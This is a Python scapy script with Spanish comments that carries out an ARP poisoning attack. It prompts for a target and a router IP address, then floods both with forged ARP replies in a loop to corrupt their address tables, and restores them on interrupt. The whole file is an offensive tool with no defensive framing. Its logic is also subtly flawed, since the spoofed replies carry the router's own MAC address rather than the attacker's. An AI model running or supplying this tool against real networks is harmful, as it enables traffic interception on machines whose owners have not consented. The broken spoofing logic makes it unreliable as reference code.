from scapy.all import *
import os
import sys
import time

# Función para obtener la dirección MAC de una IP dada
def obtener_mac(ip):
    ans, unans = arping(ip)
    for s, r in ans:
        return r[Ether].src
    return None

# Función para enviar paquetes ARP falsificados
def envenenar(ip_objetivo, ip_fuente, mac_fuente):
    mac_objetivo = obtener_mac(ip_objetivo)
    if mac_objetivo is None:
        print(f"Error al obtener la dirección MAC de {ip_objetivo}")
        sys.exit(1)
    
    send(ARP(op=2, pdst=ip_objetivo, psrc=ip_fuente, hwdst=mac_objetivo, hwsrc=mac_fuente), verbose=False)

# Función para restaurar las tablas ARP a su estado original
def restaurar(ip_objetivo, ip_fuente, mac_objetivo, mac_fuente):
    send(ARP(op=2, pdst=ip_objetivo, psrc=ip_fuente, hwdst=mac_objetivo, hwsrc=mac_fuente), count=4, verbose=False)

if __name__ == "__main__":
    # Verificar si el script se está ejecutando como root
    if os.geteuid() != 0:
        print("Debes ejecutar este script como root")
        sys.exit(1)

    # Solicitar la IP de la máquina objetivo y del router
    ip_objetivo = input("Introduce la dirección IP de la máquina objetivo: ")
    ip_router = input("Introduce la dirección IP del router: ")

    mac_fuente = obtener_mac(ip_router)
    if mac_fuente is None:
        print("Error al obtener la dirección MAC del router")
        sys.exit(1)

    try:
        print("Iniciando envenenamiento ARP...")
        while True:
            envenenar(ip_objetivo, ip_router, mac_fuente)
            envenenar(ip_router, ip_objetivo, mac_fuente)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Restaurando las tablas ARP...")
        mac_objetivo = obtener_mac(ip_objetivo)
        mac_router = obtener_mac(ip_router)
        if mac_objetivo is not None and mac_router is not None:
            restaurar(ip_objetivo, ip_router, mac_objetivo, mac_router)
            restaurar(ip_router, ip_objetivo, mac_router, mac_objetivo)
        print("Saliendo...")

